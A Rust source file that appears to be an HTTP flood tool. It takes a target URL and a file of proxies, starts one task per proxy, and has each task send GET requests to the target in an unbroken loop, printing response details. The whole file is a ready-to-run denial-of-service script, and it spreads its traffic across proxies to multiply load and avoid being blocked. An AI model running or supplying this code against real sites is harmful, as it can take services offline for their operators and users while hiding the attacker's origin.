use reqwest::Version;
use std::env;
use tokio::{fs, task};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();

    let proxies = fs::read_to_string(&args[2].to_string()).await?;

    let handles = proxies
        .lines()
        .map(|proxy| {
            let proxy = proxy.to_string();
            let args = args.clone();

            task::spawn(async move {
                let client = reqwest::Client::builder()
                    .proxy(reqwest::Proxy::all(&proxy).unwrap())
                    .build()
                    .unwrap();

                loop {
                    match client.get(&args[1].to_string()).send().await {
                        Ok(res) => println!(
							"\n{}\nRemote Addr: {}\nStatus: {}\nVersion: {}\nContent Length: {}\n",
							proxy,
                            match res.remote_addr() {
                                Some(data) => data.to_string(),
                                _ => "NULL".to_string(),
                            },
							res.status(),
							match res.version() {
                                Version::HTTP_09 => "HTTP/0.9",
                                Version::HTTP_10 => "HTTP/1.0",
                                Version::HTTP_11 => "HTTP/1.1",
                                Version::HTTP_2 => "HTTP/2.0",
                                Version::HTTP_3 => "HTTP/3.0",
                                _ => "NULL"
                            },
							match res.content_length() {
                                Some(data) => data.to_string(),
                                _ => "NULL".to_string()
                            }
						),
                        Err(err) => eprintln!("{}: {}", proxy, err)
                    }
                }
            })
        })
        .collect::<Vec<_>>();

    for handle in handles {
        handle.await?;
    }

    Ok(())
}
